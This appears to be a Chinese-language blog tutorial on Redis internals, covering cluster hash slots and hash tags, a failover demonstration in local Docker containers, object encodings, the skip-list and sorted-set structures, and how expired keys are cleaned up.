<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YzRhMTQ3ODY1YTUyYjI3NTEwMDFlMzVlOTJmYWM2ODZfUXVPeVE2bFJ6aFd1UkpvNDh2UHMxR09aRzFpZXRLczBfVG9rZW46V0NZTWJDUnVVb3VYMlV4dVRmZGNCZ2hUbkFlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>如图中所示：</p>
<ul>
<li>Master[0]，本例中就是7001节点，分配到的插槽是0~5460</li>
<li>Master[1]，本例中就是7002节点，分配到的插槽是5461~10922</li>
<li>Master[2]，本例中就是7003节点，分配到的插槽是10923~16383</li>
</ul>
<p>当我们读写数据时，Redis基于<code>CRC16</code> 算法对<code>key</code>做<code>hash</code>运算，得到的结果与<code>16384</code>取余，就计算出了这个<code>key</code>的<code>slot</code>值。然后到<code>slot</code>所在的Redis节点执行读写操作。</p>
<p>不过<code>hash slot</code>的计算也分两种情况：</p>
<ul>
<li>当<code>key</code>中包含<code>&#123;&#125;</code>时，根据<code>&#123;&#125;</code>之间的字符串计算<code>hash slot</code></li>
<li>当<code>key</code>中不包含<code>&#123;&#125;</code>时，则根据整个<code>key</code>字符串计算<code>hash slot</code></li>
</ul>
<p>例如：</p>
<ul>
<li>key是<code>user</code>，则根据<code>user</code>来计算hash slot</li>
<li>key是<code>user:&#123;age&#125;</code>，则根据<code>age</code>来计算hash slot</li>
</ul>
<p>我们来测试一下，先于<code>7001</code>建立连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it r1 bash</span><br><span class="line"><span class="comment"># 进入redis-cli</span></span><br><span class="line">redis-cli -p 7001</span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line"><span class="built_in">set</span> user jack</span><br></pre></td></tr></table></figure>
<p>会发现报错了：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YmRjZWRjNDU2YTAxODE5YTE3ZGJkZTdhZmEzZWM3NjRfWGphdW1EV1lQbktJcVFobVRhNjNDcE4yT1BiN3JUZVdfVG9rZW46WnQ3MWJKRjhIb0tCQXh4ZEFBdmNtdTNLbjZlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>提示我们<code>MOVED 5474</code>，其实就是经过计算，得出<code>user</code>这个<code>key</code>的<code>hash slot</code> 是<code>5474</code>，而<code>5474</code>是在<code>7002</code>节点，不能在<code>7001</code>上写入！！</p>
<p>说好的任意节点都可以读写呢？</p>
<p>这是因为我们连接的方式有问题，连接集群时，要加<code>-c</code>参数：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过7001连接集群</span></span><br><span class="line">redis-cli -c -p 7001</span><br><span class="line"><span class="comment"># 存入数据</span></span><br><span class="line"><span class="built_in">set</span> user jack</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjFkMmZmNWMxNGQ2YjU0ZmVhNmQ0ZjA4MGE2MTNlYjdfMGp6N2I2SzlyU2lNSHBSVHFZU256R1QyZWFWM3FZSEhfVG9rZW46UnhvMWJxd2p6b2xyRjR4cThVVmNFMHA1bmJjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>可以看到，客户端自动跳转到了<code>5474</code>这个<code>slot</code>所在的<code>7002</code>节点。</p>
<p>现在，我们添加一个新的key，这次加上<code>&#123;&#125;</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 试一下key中带&#123;&#125;</span></span><br><span class="line"><span class="built_in">set</span> user:&#123;age&#125; 21</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再试一下key中不带&#123;&#125;</span></span><br><span class="line"><span class="built_in">set</span> age 20</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NGRlOGM0MDJmY2E3Njk3ZTZjMGNmYzBkNmU3NmQwNjlfOExlMENBYkc0eEhPTHJZZmh4OVBFSThGYnVKTjJjb1pfVG9rZW46RzZJV2J0emlDb21Fa1p4dUxFWWNhNjV6bjVjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>可以看到<code>user:&#123;age&#125;</code>和<code>age</code>计算出的<code>slot</code>都是<code>741</code>。</p>
<h3 id="故障转移">故障转移</h3>
<p>分片集群的节点之间会互相通过ping的方式做心跳检测，超时未回应的节点会被标记为下线状态。当发现master下线时，会将这个master的某个slave提升为master。</p>
<p>我们先打开一个控制台窗口，利用命令监测集群状态：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch docker <span class="built_in">exec</span> -it r1 redis-cli -p 7001 cluster nodes</span><br></pre></td></tr></table></figure>
<p>命令前面的watch可以每隔一段时间刷新执行结果，方便我们实时监控集群状态变化。</p>
<p>接着，我们故技重施，利用命令让某个master节点休眠。比如这里我们让<code>7002</code>节点休眠，打开一个新的ssh控制台，输入下面命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it r2 redis-cli -p 7002 DEBUG <span class="built_in">sleep</span> 30</span><br></pre></td></tr></table></figure>
<p>可以观察到，集群发现7002宕机，标记为下线：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTEzNjEyZWNlMTQxOGNiYjkxY2U4MjExYTNmNzQ0MGFfelZ0YmZJazB0amI3NlF3T3M5MlVCSHZQUTNaR3ZSNm5fVG9rZW46VDBGamJHcTB0bzkxUFR4YUpvWGNhVWQ5bmpkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>过了一段时间后，7002原本的小弟7006变成了<code>master</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NGFjMzZiZmFlZDFlYTIwYWZhMjA5MjM5MjBkYjcwZmRfY1RxMDhSVW0wemx4QWJNSG1UblZMa2NaT1psUTRxSE5fVG9rZW46VU56eGJJUlUwb0Z2TWh4RTh0TmNZdEczbmxlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>而7002被标记为<code>slave</code>，而且其<code>master</code>正好是7006，主从地位互换。</p>
<p>Redis分片集群如何判断某个key应该在哪个实例？</p>
<ul>
<li>将16384个插槽分配到不同的实例</li>
<li>根据key计算哈希值，对16384取余</li>
<li>余数作为插槽，寻找插槽所在实例即可</li>
</ul>
<p>如何将同一类数据固定的保存在同一个Redis实例？</p>
<ul>
<li>Redis计算key的插槽值时会判断key中是否包含<code>&#123;&#125;</code>，如果有则基于<code>&#123;&#125;</code>内的字符计算插槽</li>
<li>数据的key中可以加入<code>&#123;类型&#125;</code>，例如key都以<code>&#123;typeId&#125;</code>为前缀，这样同类型数据计算的插槽一定相同</li>
</ul>
<h2 id="redis数据结构">redis数据结构</h2>
<p>我们常用的Redis数据类型有5种，分别是：</p>
<ul>
<li>String</li>
<li>List</li>
<li>Set</li>
<li>SortedSet</li>
<li>Hash</li>
</ul>
<p>还有一些高级数据类型，比如Bitmap、HyperLogLog、GEO等，其底层都是基于上述5种基本数据类型。因此在Redis的源码中，其实只有5种数据类型。</p>
<h3 id="RedisObject">RedisObject</h3>
<p>不管是任何一种数据类型，最终都会封装为RedisObject格式，它是一种结构体，C语言中的一种结构，可以理解为Java中的类。</p>
<p>结构大概是这样的：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDA1YTc3YTliNzRmZTVjNjcxMzdhMzAzNDgyMzdjMDBfdVM1eWFienJES1RORkNLVnVvOFV1T3ZlYjR2Z2lHREFfVG9rZW46RDVJZGJtYXVxb0wxV0Z4aUNiVGMzRkxnbkpnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>可以看到整个结构体中并不包含真实的数据，仅仅是对象头信息，内存占用的大小为4+4+24+32+64 = 128bit</p>
<p>也就是16字节，然后指针<code>ptr</code>指针指向的才是真实数据存储的内存地址。所以RedisObject的内存开销是很大的。</p>
<p>属性中的<code>encoding</code>就是当前对象底层采用的<strong>数据结构</strong>或<strong>编码方式</strong>，可选的有11种之多：</p>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>编号</strong></th>
<th style="text-align:left"><strong>编码方式</strong></th>
<th style="text-align:left"><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">0</td>
<td style="text-align:left">OBJ_ENCODING_RAW</td>
<td style="text-align:left">raw编码动态字符串</td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:left">OBJ_ENCODING_INT</td>
<td style="text-align:left">long类型的整数的字符串</td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:left">OBJ_ENCODING_HT</td>
<td style="text-align:left">hash表（也叫dict）</td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td style="text-align:left">OBJ_ENCODING_ZIPMAP</td>
<td style="text-align:left">已废弃</td>
</tr>
<tr>
<td style="text-align:left">4</td>
<td style="text-align:left">OBJ_ENCODING_LINKEDLIST</td>
<td style="text-align:left">双端链表</td>
</tr>
<tr>
<td style="text-align:left">5</td>
<td style="text-align:left">OBJ_ENCODING_ZIPLIST</td>
<td style="text-align:left">压缩列表</td>
</tr>
<tr>
<td style="text-align:left">6</td>
<td style="text-align:left">OBJ_ENCODING_INTSET</td>
<td style="text-align:left">整数集合</td>
</tr>
<tr>
<td style="text-align:left">7</td>
<td style="text-align:left">OBJ_ENCODING_SKIPLIST</td>
<td style="text-align:left">跳表</td>
</tr>
<tr>
<td style="text-align:left">8</td>
<td style="text-align:left">OBJ_ENCODING_EMBSTR</td>
<td style="text-align:left">embstr编码的动态字符串</td>
</tr>
<tr>
<td style="text-align:left">9</td>
<td style="text-align:left">OBJ_ENCODING_QUICKLIST</td>
<td style="text-align:left">快速列表</td>
</tr>
<tr>
<td style="text-align:left">10</td>
<td style="text-align:left">OBJ_ENCODING_STREAM</td>
<td style="text-align:left">Stream流</td>
</tr>
<tr>
<td style="text-align:left">11</td>
<td style="text-align:left">OBJ_ENCODING_LISTPACK</td>
<td style="text-align:left">紧凑列表</td>
</tr>
</tbody>
</table>
<p>Redis中的5种不同的数据类型采用的底层数据结构和编码方式如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>数据类型</strong></th>
<th style="text-align:left"><strong>编码方式</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">STRING</td>
<td style="text-align:left"><code>int</code>、<code>embstr</code>、<code>raw</code></td>
</tr>
<tr>
<td style="text-align:left">LIST</td>
<td style="text-align:left"><code>LinkedList和ZipList</code>(3.2以前)、<code>QuickList</code>（3.2以后）</td>
</tr>
<tr>
<td style="text-align:left">SET</td>
<td style="text-align:left"><code>intset</code>、<code>HT</code></td>
</tr>
<tr>
<td style="text-align:left">ZSET</td>
<td style="text-align:left"><code>ZipList</code>（7.0以前）、<code>Listpack</code>（7.0以后）、<code>HT</code>、<code>SkipList</code></td>
</tr>
<tr>
<td style="text-align:left">HASH</td>
<td style="text-align:left"><code>ZipList</code>（7.0以前）、<code>Listpack</code>（7.0以后）、<code>HT</code></td>
</tr>
</tbody>
</table>
<h3 id="SkipList">SkipList</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=N2ViOTlkNTRkYjYyNGE0MDdmZGUzMzk4NDcwOWI0YmZfU095WmNuTVRTaHJ0M25sS3VXTmdUSzI4Q2NRVFBTMkNfVG9rZW46WWlkOGJxOXY1b090SVh4MGh1TWM2bUp5bk9nXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGI0MzUxNDBhNTA0YmM3N2ExMTJhMThhZGYzNGZmNTJfQmVQcERXTER6MVFvVVF4U3BFZzloTjVTakxIYlZJWXRfVG9rZW46QlV0VGI2V1hFb082MnJ4eW5tZ2NUQnZBbnBLXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>传统链表只有指向前后元素的指针，因此只能顺序依次访问。如果查找的元素在链表中间，查询的效率会比较低。而SkipList则不同，它内部包含跨度不同的多级指针，可以让我们跳跃查找链表中间的元素，效率非常高。</p>
<p>其结构如图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ODE3ZWIyZGM1MGVkNjFjZTU3MmEyMWQ3ODM3YjNiNzhfRFptdVdCR3cwUHNXM3R1Wnp5MlhLV3VBUGdrN2FOTVNfVG9rZW46Q0dyMmJMNXhVb3o1RGJ4Qk1JZWNRaGl2bnFmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>我们可以看到1号元素就有指向3、5、10的多个指针，查询时就可以跳跃查找。例如我们要找大小为14的元素，查找的流程是这样的：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjBiZTE3ZTIzMTRjZWI3MzQ2ZWM5Mjc2MTRjN2NhOWVfU21WeGJGREtHNExiZVQyN1gxd1lITVM3SkZ2TjY0TElfVG9rZW46UkhBVGJEVTdmb05mdWp4QlVNcGN6aWZjbnViXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<ul>
<li>首先找元素1节点最高级指针，也就是4级指针，起始元素大小为1，指针跨度为9，可以判断出目标元素大小为10。由于14比10大，肯定要从10这个元素向下接着找。</li>
<li>找到10这个元素，发现10这个元素的最高级指针跨度为5，判断出目标元素大小为15，大于14，需要判断下级指针</li>
<li>10这个元素的2级指针跨度为3，判断出目标元素为13，小于14，因此要基于元素13接着找</li>
<li>13这个元素最高级级指针跨度为2，判断出目标元素为15，比14大，需要判断下级指针。</li>
<li>13的下级指针跨度为1，因此目标元素是14，刚好于目标一致，找到。</li>
</ul>
<p>这种多级指针的查询方式就避免了传统链表的逐个遍历导致的查询效率下降问题。在对有序数据做随机查询和排序时效率非常高。</p>
<p>跳表的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">zskiplist</span> &#123;</span></span><br><span class="line">    <span class="comment">// 头尾节点指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zskiplistNode</span> *<span class="title">header</span>, *<span class="title">tail</span>;</span></span><br><span class="line">    <span class="comment">// 节点数量</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> length;</span><br><span class="line">    <span class="comment">// 最大的索引层级</span></span><br><span class="line">    <span class="type">int</span> level;</span><br><span class="line">&#125; zskiplist;</span><br></pre></td></tr></table></figure>
<p>可以看到SkipList主要属性是header和tail，也就是头尾指针，因此它是支持双向遍历的。</p>
<p>跳表中节点的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">zskiplistNode</span> &#123;</span></span><br><span class="line">    sds ele; <span class="comment">// 节点存储的字符串</span></span><br><span class="line">    <span class="type">double</span> score;<span class="comment">// 节点分数，排序、查找用</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zskiplistNode</span> *<span class="title">backward</span>;</span> <span class="comment">// 前一个节点指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zskiplistLevel</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">zskiplistNode</span> *<span class="title">forward</span>;</span> <span class="comment">// 下一个节点指针</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> span; <span class="comment">// 索引跨度</span></span><br><span class="line">    &#125; level[]; <span class="comment">// 多级索引数组</span></span><br><span class="line">&#125; zskiplistNode;</span><br></pre></td></tr></table></figure>
<p>每个节点中都包含ele和score两个属性，其中score是得分，也就是节点排序的依据。ele则是节点存储的字符串数据指针。</p>
<p>其内存结构如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NDVlNjhhNWRmYTkwMjFiYTA5N2Y4OTA1YjA0OWEyNjZfV1FtRFhNUEVTR05lRzlJdDRIM2VzM2tKd01UeG14czFfVG9rZW46Ujd6ZWJSdEZIb1lwUXR4UU80eGNNUFRWbkxkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="SortedSet">SortedSet</h3>
<p><strong>面试题</strong>：Redis的<code>SortedSet</code>底层的数据结构是怎样的？</p>
<p><strong>答</strong>：SortedSet是有序集合，底层的存储的每个数据都包含element和score两个值。score是得分，element则是字符串值。SortedSet会根据每个element的score值排序，形成有序集合。</p>
<p>它支持的操作很多，比如：</p>
<ul>
<li>根据element查询score值</li>
<li>按照score值升序或降序查询element</li>
</ul>
<p>要实现根据element查询对应的score值，就必须实现element与score之间的键值映射。SortedSet底层是基于<strong>HashTable</strong>来实现的。</p>
<p>要实现对score值排序，并且查询效率还高，就需要有一种高效的有序数据结构，SortedSet是基于<strong>跳表</strong>实现的。</p>
<p>加分项：因为SortedSet底层需要用到两种数据结构，对内存占用比较高。因此Redis底层会对SortedSet中的元素大小做判断。如果<strong>元素大小小于128</strong>且<strong>每个元素都小于64字节</strong>，SortedSet底层会采用<strong>ZipList</strong>，也就是<strong>压缩列表</strong>来代替<strong>HashTable</strong>和<strong>SkipList</strong></p>
<p>不过，<code>ZipList</code>存在连锁更新问题，因此而在Redis7.0版本以后，<code>ZipList</code>又被替换为<strong>Listpack</strong>（紧凑列表）。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MmUwZDM0NjcwMTkzZmM3ZTMxNDc1ZWFjOGJkZTYxNWZfNUlhUTN0cWt1Y09tTUVhSG4yV1N6ZFJhcGVJR3gwR0lfVG9rZW46RWpLOWJ0WDZjb0ZEM0J4Qk1sVmNFODB0blNnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>Redis源码中<code>zset</code>，也就是<code>SortedSet</code>的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">zset</span> &#123;</span></span><br><span class="line">    dict *dict; <span class="comment">// dict，底层就是HashTable</span></span><br><span class="line">    zskiplist *zsl; <span class="comment">// 跳表</span></span><br><span class="line">&#125; zset;</span><br></pre></td></tr></table></figure>
<p>其内存结构如图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NDUyMjhhNDZlNTYxZjY4MTM1MTk5MTAyYzhmNWIxZDhfd3JoRW9COEx2UGV0WmlMRTQ0NWRhZFJjc05oeGJaQlBfVG9rZW46U3ppUmJnSUJIb0t5SnJ4OWJoTmNoSHZpbktkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="redis内存回收">redis内存回收</h2>
<p>当内存达到上限，就无法存储更多数据了。因此，Redis内部会有两套内存回收的策略：</p>
<ul>
<li>内存过期策略</li>
<li>内存淘汰策略</li>
</ul>
<h3 id="过期KEY处理">过期KEY处理</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NTNiOTcwN2VlZTBmYTJlNThkMTJmZTFkNGE5YmU4NDVfeG95Tks1TzJ1YjhyTkYzYnYwRTludlRjcWNLSDl0UW1fVG9rZW46V3l2bWJlaWVIb3BMdUx4SDlJN2M5Q0FjbmVoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjE1N2VmYjM3ODBmOWUxM2ZlOWY5YmYxNjAyM2E0NTZfTXZoMVgyRU0xODNnMXJmYXFWcjRJTkRSVzJIQ1I1SlNfVG9rZW46UnExVmJwR1Fmb1BJdG94NDcxVGNHVjJZbkZzXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MGQxMTI5NGFiOTYzZTI1OTc3MmUxZTFkMjY1OTUxNWJfdDZvWTJhSlR4YVhhMlh4NktDa296ak40WU5WMVhTc0pfVG9rZW46SklZUWJISVRrb1FWcjF4ZVhybGNERGltbnFkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><strong>SLOW</strong>模式规则：</p>
<ul>
<li>① 执行频率受<code>server.hz</code>影响，默认为10，即每秒执行10次，每个执行周期100ms。</li>
<li>② 执行清理耗时不超过一次执行周期的25%，即25ms.</li>
<li>③ 逐个遍历db，逐个遍历db中的bucket，抽取20个key判断是否过期</li>
<li>④ 如果没达到时间上限（25ms）并且过期key比例大于10%，再进行一次抽样，否则结束</li>
</ul>
<p><strong>FAST</strong>模式规则（过期key比例小于10%不执行）：</p>
<ul>
<li>① 执行频率受<code>beforeSleep()</code>调用频率影响，但两次FAST模式间隔不低于2ms</li>
<li>② 执行清理耗时不超过1ms</li>
<li>③ 逐个遍历db，逐个遍历db中的bucket，抽取20个key判断是否过期</li>
<li>④ 如果没达到时间上限（1ms）并且过期key比例大于10%，再进行一次抽样，否则结束</li>
</ul>
<h3 id="SLOW-模式规则"><strong>SLOW 模式规则</strong></h3>
<p>SLOW 模式是 Redis 的默认周期性删除模式，主要目的是平衡性能和过期键的清理速度，避免对 Redis 正常操作（如读写请求）造成影响。</p>
<ol>
<li><strong>执行频率由</strong> <strong><code>server.hz</code></strong> <strong>控制</strong></li>
</ol>
<ul>
<li>Redis 的 <code>server.hz</code> 配置决定了每秒执行定期任务的次数。
<ul>
<li>默认值为 <code>10</code>，即每秒执行 <strong>10 次</strong> 定期任务。</li>
<li>每次任务间隔时间为 <code>100ms</code>（100 毫秒 = 1 秒 ÷ 10 次）。</li>
<li>定期任务包括过期键清理、内存碎片整理等。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>执行清理的时间限制</strong></li>
</ol>
<ul>
<li>Redis 为每次 SLOW 模式的过期键清理设置了时间上限：<strong>单次任务不超过 25% 的执行周期时间</strong>。
<ul>
<li>在默认 <code>server.hz=10</code> 的情况下，周期为 <code>100ms</code>，因此清理时间上限为 <code>25ms</code>（100ms × 25%）。</li>
<li>目的是确保清理任务不会占用过多 CPU，影响正常的读写操作。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>遍历 DB 和 bucket，抽取 20 个 key 判断是否过期</strong></li>
</ol>
<ul>
<li>Redis 的键会存储在多个 <strong>数据库（DB）</strong> 和 <strong>bucket（哈希桶）</strong> 中，SLOW 模式会逐个遍历它们。
<ul>
<li>每次从一个 bucket 中抽取 <strong>20 个 key</strong>，检查这些键是否过期。</li>
<li>如果发现键已过期，会直接删除。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>继续抽样的条件</strong></li>
</ol>
<ul>
<li>在以下条件下，Redis 会继续下一轮抽样清理：
<ul>
<li><strong>尚未达到时间上限（25ms）</strong>。</li>
<li>抽样的过期键比例 &gt; <strong>10%</strong>（例如，抽取的 20 个键中有 2 个以上过期）。</li>
</ul>
</li>
<li>如果不满足上述条件（时间超限或过期比例低于 10%），当前清理任务会结束。</li>
</ul>
<h3 id="FAST-模式规则"><strong>FAST 模式规则</strong></h3>
<p>FAST 模式是 Redis 在特定条件下的快速过期清理模式，主要目的是当过期键比例较高时加快清理速度，尽快释放内存压力。</p>
<ol>
<li><strong>执行频率由</strong> <strong><code>beforeSleep()</code></strong> <strong>控制</strong></li>
</ol>
<ul>
<li><code>beforeSleep()</code> 是 Redis 主线程的一个方法，它会在每次执行事件循环（如处理读写请求、内部任务）时被调用。
<ul>
<li>FAST 模式的清理频率取决于 <code>beforeSleep()</code> 的调用频率。</li>
<li><strong>两次 FAST 模式任务的间隔不能低于 2ms</strong>，避免频繁触发。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>执行时间上限为 1ms</strong></li>
</ol>
<ul>
<li>FAST 模式的清理时间比 SLOW 模式更短，每次任务的时间上限为 <strong>1ms</strong>。
<ul>
<li>短时间清理的目的是减少对主线程的性能影响。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>遍历 DB 和 bucket，抽取 20 个 key 判断是否过期</strong></li>
</ol>
<ul>
<li>与 SLOW 模式类似，FAST 模式同样会逐个遍历 DB 和 bucket。
<ul>
<li>每次从一个 bucket 中抽取 <strong>20 个 key</strong>，检查它们是否过期。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>继续抽样的条件</strong></li>
</ol>
<ul>
<li>如果以下条件同时满足，Redis 会继续下一轮抽样清理：
<ul>
<li><strong>尚未达到时间上限（1ms）</strong>。</li>
<li>抽样的过期键比例 &gt; <strong>10%</strong>。</li>
</ul>
</li>
<li>如果过期键比例低于 10%，FAST 模式任务会停止，不再进行额外清理。</li>
</ul>
<h3 id="内存淘汰策略">内存淘汰策略</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ODYwNjk3YzI3MDhhZTQ2OGY4NDgyZmRhMzUzODFmMzJfcHF5S0hkQzdBamxwSFBXNUlyTVhsYXpCYVpOam5aVGFfVG9rZW46S2hnMGJSQlpub29MRDZ4STJ2NmNsYmxRbldnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
